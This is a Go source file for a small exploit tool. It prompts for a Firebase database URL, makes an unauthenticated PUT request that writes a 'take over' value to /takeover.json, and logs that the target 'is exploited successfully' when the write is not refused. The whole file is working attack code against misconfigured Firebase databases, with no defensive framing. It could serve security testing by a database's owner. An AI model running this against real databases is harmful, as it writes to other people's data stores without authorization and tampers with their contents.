package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/rs/zerolog/log"
	"io/ioutil"
	"net/http"
	"time"
)

type TakeOver struct {
	Value    string `json:"value"`
}

func main()  {
	var firebaseURL string

	// get firebase url from input
	fmt.Print("Enter Firebase URL: ")
	_, err := fmt.Scanf("%s", &firebaseURL)
	if err != nil {
		log.Error().Stack().Str("file", "main").Msg(err.Error())
		return
	}

	if firebaseURL == "" {
		log.Error().Stack().Str("file", "main").Msg("Firebase URL is empty.")
		return
	}

	client := &http.Client{
		Timeout: time.Second * 5,
	}

	takeover := TakeOver{
		Value: "take over",
	}

	reqBody, err := json.Marshal(takeover)

	req, err := http.NewRequest("PUT", fmt.Sprintf("%s/takeover.json", firebaseURL), bytes.NewBuffer(reqBody))
	req.Header.Set("Content-Type", "application/json")
	res, err := client.Do(req)
	if err != nil {
		log.Error().Stack().Str("file", "main").Msg(err.Error())
	}

	if res.StatusCode == 401 {
		log.Error().Stack().Str("file", "main").Msg("permission denied.")
		return
	} else if res.StatusCode == 404 {
		log.Error().Stack().Str("file", "main").Msg("database not found.")
		return
	}

	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Error().Stack().Str("file", "main").Msg(err.Error())
	}
	log.Info().Str("file", "main").Msg(fmt.Sprintf("%s is exploited successfully.", firebaseURL))
	log.Debug().Str("file", "main").Msg(fmt.Sprintf("%s", body))
}
